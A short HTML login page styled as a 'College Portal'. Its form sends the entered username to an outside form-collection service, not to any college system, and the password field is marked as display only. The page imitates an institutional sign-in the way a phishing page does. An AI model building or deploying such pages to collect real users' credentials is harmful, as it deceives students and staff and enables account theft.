<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Portal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:linear-gradient(135deg,#0d47a1,#42a5f5);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-box{
    background:#fff;
    width:360px;
    padding:30px;
    border-radius:12px;
    box-shadow:0 8px 20px rgba(0,0,0,0.2);
    text-align:center;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:6px;
}

button{
    width:100%;
    padding:12px;
    background:#1565c0;
    color:white;
    border:none;
    border-radius:6px;
    cursor:pointer;
}
</style>
</head>

<body>

<div class="login-box">

    <img src="logo_apec.png" alt="College Logo" width="90">

    <h2>College Portal</h2>

    <form action="https://forminit.com/f/nohsxqo02s2" method="POST">

        <input type="text" name="fi-sender-fullName" placeholder="Username" required>

        <!-- password UI only -->
        <input type="password" placeholder="Password" required>

        <button type="submit">Login</button>

    </form>

    <div style="margin-top:15px; color:#666;">
        © 2026 Your College Name
    </div>

</div>

</body>
</html>
